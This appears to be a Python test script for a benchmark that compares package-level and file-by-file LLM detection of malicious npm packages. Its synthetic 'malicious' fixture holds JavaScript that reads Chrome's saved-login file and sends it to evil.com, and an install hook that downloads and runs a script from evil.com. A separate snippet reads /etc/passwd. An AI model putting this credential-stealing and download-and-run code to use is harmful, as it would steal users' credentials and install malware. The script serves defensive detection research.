#!/usr/bin/env python3
"""
Test script for LLM granularity comparison (package-level vs file-by-file analysis).
"""

import asyncio
import logging
import os
from pathlib import Path
from benchmark_framework import BenchmarkSample, OpenRouterModel
from openrouter_client import OpenRouterClient, MaliciousPackagePrompts
from llm_response_parser import LLMResponseParser

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def create_test_samples():
    """Create synthetic test samples with individual files."""
    
    # Sample 1: Benign package
    benign_sample = BenchmarkSample(
        package_name="test-benign-utils",
        ecosystem="npm",
        sample_type="benign",
        ground_truth_label=0,
        raw_content="""# File: package.json
{"name": "test-utils", "version": "1.0.0", "description": "Utility functions"}
==================================================

# File: index.js
function add(a, b) {
    return a + b;
}

function multiply(a, b) {
    return a * b;
}

module.exports = { add, multiply };
==================================================

# File: README.md
# Test Utils
Simple utility functions for basic math operations.
==================================================
""",
        file_paths=["package.json", "index.js", "README.md"],
        individual_files={
            "package.json": '{"name": "test-utils", "version": "1.0.0", "description": "Utility functions"}',
            "index.js": """function add(a, b) {
    return a + b;
}

function multiply(a, b) {
    return a * b;
}

module.exports = { add, multiply };""",
            "README.md": """# Test Utils
Simple utility functions for basic math operations."""
        },
        package_size_bytes=1024,
        num_files=3
    )
    
    # Sample 2: Malicious package  
    malicious_sample = BenchmarkSample(
        package_name="test-malicious-stealer",
        ecosystem="npm",
        sample_type="malicious_intent", 
        ground_truth_label=1,
        raw_content="""# File: package.json
{"name": "innocent-utils", "version": "1.0.0", "description": "Utility functions"}
==================================================

# File: index.js
const fs = require('fs');
const os = require('os');

function stealCredentials() {
    const homeDir = os.homedir();
    try {
        const browserData = fs.readFileSync(homeDir + '/.config/google-chrome/Default/Login Data');
        // Send stolen data to attacker server
        require('https').get('https://evil.com/steal?data=' + btoa(browserData));
    } catch(e) {}
}

// Execute immediately
stealCredentials();

module.exports = { utils: true };
==================================================

# File: install.js
// Post-install hook to download additional malware
const { exec } = require('child_process');
exec('curl -o /tmp/malware.sh https://evil.com/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh');
==================================================
""",
        file_paths=["package.json", "index.js", "install.js"],
        individual_files={
            "package.json": '{"name": "innocent-utils", "version": "1.0.0", "description": "Utility functions"}',
            "index.js": """const fs = require('fs');
const os = require('os');

function stealCredentials() {
    const homeDir = os.homedir();
    try {
        const browserData = fs.readFileSync(homeDir + '/.config/google-chrome/Default/Login Data');
        // Send stolen data to attacker server
        require('https').get('https://evil.com/steal?data=' + btoa(browserData));
    } catch(e) {}
}

// Execute immediately
stealCredentials();

module.exports = { utils: true };""",
            "install.js": """// Post-install hook to download additional malware
const { exec } = require('child_process');
exec('curl -o /tmp/malware.sh https://evil.com/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh');"""
        },
        package_size_bytes=2048,
        num_files=3
    )
    
    return [benign_sample, malicious_sample]


async def test_granularity_comparison():
    """Test package-level vs file-by-file analysis."""
    
    logger.info("🧪 Testing LLM Granularity Comparison")
    logger.info("=" * 60)
    
    # Check for API key
    if not os.getenv("OPENROUTER_API_KEY"):
        logger.warning("⚠️  OPENROUTER_API_KEY not set. Skipping LLM tests.")
        test_parser_only()
        return
    
    # Create test samples
    test_samples = create_test_samples()
    
    # Create models with different granularities
    package_model = OpenRouterModel(
        model_name="GPT-4o-Package",
        openrouter_model_id="openai/gpt-4o", 
        granularity="package"
    )
    
    file_by_file_model = OpenRouterModel(
        model_name="GPT-4o-FileByFile",
        openrouter_model_id="openai/gpt-4o",
        granularity="file_by_file"
    )
    
    results = {}
    
    # Test both approaches
    async with OpenRouterClient() as openrouter_client:
        for sample in test_samples:
            sample_name = sample.package_name
            results[sample_name] = {}
            
            logger.info(f"\n🔬 Testing sample: {sample_name}")
            logger.info(f"   Ground truth: {'MALICIOUS' if sample.ground_truth_label else 'BENIGN'}")
            logger.info(f"   Files: {len(sample.individual_files)}")
            
            # Test package-level analysis
            logger.info("📦 Testing package-level analysis...")
            try:
                package_result = await package_model.predict(sample, openrouter_client)
                results[sample_name]["package"] = {
                    "prediction": package_result.prediction,
                    "confidence": package_result.confidence,
                    "success": package_result.success,
                    "cost": getattr(package_result, 'cost_usd', 0),
                    "explanation": package_result.explanation[:100] + "..." if len(package_result.explanation) > 100 else package_result.explanation
                }
                logger.info(f"   ✅ Prediction: {'MALICIOUS' if package_result.prediction else 'BENIGN'} (confidence: {package_result.confidence:.3f})")
                
            except Exception as e:
                logger.error(f"   ❌ Package-level analysis failed: {e}")
                results[sample_name]["package"] = {"error": str(e)}
            
            # Test file-by-file analysis 
            logger.info("📁 Testing file-by-file analysis...")
            try:
                file_result = await file_by_file_model.predict(sample, openrouter_client)
                results[sample_name]["file_by_file"] = {
                    "prediction": file_result.prediction,
                    "confidence": file_result.confidence,
                    "success": file_result.success,
                    "cost": getattr(file_result, 'cost_usd', 0),
                    "explanation": file_result.explanation[:100] + "..." if len(file_result.explanation) > 100 else file_result.explanation,
                    "files_analyzed": getattr(file_result, 'metadata', {}).get('files_analyzed', 0),
                    "malicious_files": getattr(file_result, 'metadata', {}).get('malicious_files', 0)
                }
                logger.info(f"   ✅ Prediction: {'MALICIOUS' if file_result.prediction else 'BENIGN'} (confidence: {file_result.confidence:.3f})")
                logger.info(f"   📊 Files analyzed: {results[sample_name]['file_by_file'].get('files_analyzed', 0)}")
                logger.info(f"   ⚠️  Malicious files: {results[sample_name]['file_by_file'].get('malicious_files', 0)}")
                
            except Exception as e:
                logger.error(f"   ❌ File-by-file analysis failed: {e}")
                results[sample_name]["file_by_file"] = {"error": str(e)}
            
            # Small delay between samples
            await asyncio.sleep(1)
    
    # Print comparison summary
    logger.info("\n" + "=" * 60)
    logger.info("📊 GRANULARITY COMPARISON SUMMARY")
    logger.info("=" * 60)
    
    total_cost = 0
    
    for sample_name, sample_results in results.items():
        logger.info(f"\n🔬 {sample_name}:")
        
        # Package-level results
        if "package" in sample_results and "error" not in sample_results["package"]:
            pkg = sample_results["package"]
            logger.info(f"   📦 Package-level: {'MALICIOUS' if pkg['prediction'] else 'BENIGN'} "
                       f"({pkg['confidence']:.3f} confidence, ${pkg['cost']:.4f})")
            total_cost += pkg['cost']
        
        # File-by-file results
        if "file_by_file" in sample_results and "error" not in sample_results["file_by_file"]:
            fbf = sample_results["file_by_file"]
            logger.info(f"   📁 File-by-file: {'MALICIOUS' if fbf['prediction'] else 'BENIGN'} "
                       f"({fbf['confidence']:.3f} confidence, ${fbf['cost']:.4f})")
            logger.info(f"      Files analyzed: {fbf.get('files_analyzed', 0)}, "
                       f"Malicious: {fbf.get('malicious_files', 0)}")
            total_cost += fbf['cost']
    
    logger.info(f"\n💰 Total API cost: ${total_cost:.4f}")
    logger.info("\n🎯 Granularity testing completed!")


def test_parser_only():
    """Test just the prompt generation for different granularities."""
    logger.info("🧪 Testing prompt generation only (no API calls)")
    
    # Test prompts
    sample_content = """function maliciousCode() {
    const fs = require('fs');
    fs.readFileSync('/etc/passwd');
}"""
    
    logger.info("\n📦 Package-level prompt:")
    package_prompt = MaliciousPackagePrompts.zero_shot_prompt(sample_content)
    logger.info(f"Length: {len(package_prompt)} chars")
    
    logger.info("\n📁 File-by-file prompt:")
    file_prompt = MaliciousPackagePrompts.file_by_file_prompt("malicious.js", sample_content)
    logger.info(f"Length: {len(file_prompt)} chars")
    
    logger.info("\n🔄 Aggregation prompt:")
    mock_analyses = [
        {"file_path": "index.js", "is_malicious": True, "confidence": 0.9, "reasoning": "Contains file system access"}
    ]
    agg_prompt = MaliciousPackagePrompts.package_aggregation_prompt("test-pkg", mock_analyses)
    logger.info(f"Length: {len(agg_prompt)} chars")
    
    logger.info("✅ Prompt generation test completed!")


if __name__ == "__main__":
    asyncio.run(test_granularity_comparison())